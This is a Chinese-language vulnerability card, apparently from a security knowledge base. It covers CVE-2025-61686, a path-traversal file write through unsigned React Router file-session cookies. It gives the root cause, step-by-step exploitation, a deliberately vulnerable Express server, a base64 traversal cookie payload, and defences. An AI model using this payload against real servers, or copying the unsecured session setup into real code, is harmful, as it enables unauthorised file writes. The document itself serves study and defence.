---
id: web-nodejs-react-router-file-session-id-traversal-write
title: React Router @react-router/node createFileSessionStorage 未配置 secrets：会话 id 篡改经 getFile 路径穿越任意文件写入（CVE-2025-61686）
type: scenario
domain: web
path: web/nodejs
technique: react-router-file-session-id-path-traversal
aliases:
- CVE-2025-61686
- React Router 任意文件写入
- createFileSessionStorage 路径穿越
- '@react-router/node getFile traversal'
- 未签名会话 Cookie 路径穿越
- session id path traversal
tags:
- nodejs
- react-router
- session
- cookie
- unsigned-cookie
- path-traversal
- arbitrary-file-write
- cve-2025-61686
cve:
- CVE-2025-61686
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V56
  verified_at: '2026-11-05T09:03:39+08:00'
  notes: 已对照原文核对：CVE-2025-61686、@react-router/node 7.9.3、createFileSessionStorage 未配 secrets、getFile 的 path.join(dir,id.slice(0,4),id.slice(4))、updateData 直用客户端 id、base64 恶意 id 越界写 flag.txt，均与 8 张图片一致；原文未给受影响区间，卡片未写 affected_versions 正确；原文只证明越界写 JSON 会话文件，未验证内容完全可控/RCE，卡片未夸大；PoC 未本地复跑。
---

## 一句话结论

使用 `@react-router/node` 的 `createFileSessionStorage()` 且 cookie 配置中未提供 `secrets` 时，会话 Cookie 不受签名保护，客户端可把 session id 改成含 `../` 的任意字符串；`updateData()` 把它直接交给 `getFile()` 的 `path.join(dir, id.slice(0,4), id.slice(4))`，在提交会话（`commitSession`）时写到 `dir` 之外的任意路径（CVE-2025-61686）。

## 原理

- `createFileSessionStorage()` 的 cookie 配置若省略 `secrets`，会话 Cookie 既没有 HMAC/签名，也不会在读取时校验完整性；`@react-router/node` 会打印警告 `The "session" cookie is not signed...`。攻击者因此可以随意伪造 Cookie 中的 session id。
- 文件存储的路径由 `packages/react-router-node/sessions/fileStorage.ts` 的 `getFile(dir, id)` 生成：

  ```ts
  export function getFile(dir: string, id: string): string {
    return path.join(dir, id.slice(0, 4), id.slice(4));
  }
  ```

  它只按前 4 个字符分一级目录，剩余部分作为文件名拼接，没有校验 `id` 是否为 16 位十六进制，也没有用 `path.resolve` 后确认结果仍位于 `dir` 内。`path.join` 会规范化路径，`../` 不会被删除，因此 `id` 中的穿越序列可以跳出 `dir`。
- `updateData(id, data, expires)` 直接执行 `let file = getFile(dir, id); await fsp.mkdir(path.dirname(file), { recursive: true }); await fsp.writeFile(file, JSON.stringify({data, expires}), "utf-8")`。只要应用在一次请求中读取会话后调用 `commitSession()`（常见的“记录访问时间/写入用户数据”逻辑），攻击者伪造的 id 就会进入 `updateData` 并落盘。
- 初始的 `createData()` 使用 `crypto.getRandomValues(8)` 生成 16 位十六进制 id，本身不可控；漏洞点在于后续更新时无条件信任客户端回传的 id。写入内容为 `{"data":...,"expires":...}` 的 JSON，`data` 是否部分可控取决于应用往 session 里存了什么。
- 两条缺陷叠加：未配置 `secrets` 让 id 可篡改（会话完整性缺失），`getFile` 的路径拼接让篡改的 id 变成目录穿越（任意文件写入）。仅修复签名而不过滤 id，仍可能在别处触发路径穿越；仅过滤 id 而不签名，攻击者仍可伪造合法 id 实施会话固定/身份伪造。

## 触发条件

- 应用使用 `@react-router/node` 的 `createFileSessionStorage({ dir, cookie })`，且 `cookie` 中未设置 `secrets`（原文复现版本 `@react-router/node@7.9.3`，原文未给出受影响区间）。
- 攻击者能向一个会执行 `getSession()` 且随后 `commitSession()` 的端点发送请求（例如写入访问时间、登录态刷新等）。
- 运行 Node 进程的用户对目标路径有写权限；目标文件/目录的父目录可按需由 `mkdir({recursive:true})` 创建。
- Cookie 值按框架格式编码（原文为 base64 的带引号 session id 字符串），无需任何服务端签名。

## 利用步骤

1. 确认目标响应 `Set-Cookie` 形如 `session=<base64>`，且服务端日志/警告出现 cookie is not signed；判断使用了未配置 `secrets` 的 file session storage。
2. 构造恶意 id，例如 `8370abe133f3721a/../../../../flag.txt`：前 4 位任意，后面用 `../` 逐级跳出 `dir`。
3. 将 id 按应用格式做 base64（原文为带双引号的 JSON 字符串），得到 Cookie 值。
4. 携带该 Cookie 请求会提交会话的端点；`updateData()` 调用 `getFile()` 拼接出穿越路径，`mkdir` 创建所需目录后 `writeFile` 写入。
5. 检查 `dir` 的上级目录，确认出现越界文件（原文在项目上级目录生成 `flag.txt`）；响应体还会回显 `Session written. ID: <恶意 id>`。

## PoC

```js
// server.js（最小漏洞环境，@react-router/node@7.9.3）
const express = require('express');
const cookieParser = require('cookie-parser');
const { createFileSessionStorage } = require('@react-router/node');

const app = express();
app.use(cookieParser());

const sessionStorage = createFileSessionStorage({
  dir: './sessions',
  cookie: { name: 'session', httpOnly: true } // 故意不配置 secrets
});

app.get('/trigger', async (req, res) => {
  const session = await sessionStorage.getSession(req.headers.cookie);
  session.set('visited_at', new Date().toISOString());
  res.setHeader('Set-Cookie', await sessionStorage.commitSession(session));
  res.send(`Session written. ID: ${session.id}`);
});

app.listen(3000);
```

```http
GET /trigger HTTP/1.1
Host: localhost:3000
Cookie: session=IjgzNzBhYmUxMzNmMzcyMWEvLi4vLi4vLi4vLi4vZmxhZy50eHQi
```

```text
# 该 Cookie 为 "8370abe133f3721a/../../../../flag.txt" 的 base64
# 响应：Session written. ID: 8370abe133f3721a/../../../../flag.txt
# 结果：./sessions 的上级目录出现 flag.txt（原文截图）
```

## 变体与关联

- id 不必是十六进制；前 4 位同样可以放穿越片段，`path.join` 会整体规范化，最终路径取决于拼接后的 `..` 数量。
- 写入内容为 JSON 会话数据；若应用把用户可控字段存进 session，攻击者可进一步控制落盘内容，覆盖配置文件/脚本可能造成更严重后果（原文未验证 RCE，仅确认越界写文件）。
- 关联：未签名 Cookie 本身即可伪造会话身份（同库 `web/generic/auth/cookie` 下的 base64 身份伪造、硬编码密钥 Cookie 伪造卡）；本卡重点是“会话 id 进入文件路径”的二次利用。
- 边界：仅当 `updateData` 被调用（提交会话）时才写文件；只调用 `getSession` 而不 commit 的端点不会触发写入。

## 检测与防御

- 配置 `secrets` 数组并轮换密钥，启用会话 Cookie 签名；不要依赖客户端 id 的完整性。
- 在 `getFile`/`updateData` 使用前强校验 id：仅允许 `^[0-9a-f]{16}$`，或 `path.resolve(dir, ...)` 后检查 `path.relative` 不以 `..` 开头且结果位于 `dir` 内。
- 升级 `@react-router/node` 到包含该 CVE 修复的版本；审计所有 `createFileSessionStorage` 调用是否缺少 `secrets`。
- 检测：Cookie/base64 解码后包含 `../`、`/`、非十六进制字符；session 目录之外出现由 Node 进程写入的 JSON 文件；日志中的 unsigned cookie 警告。
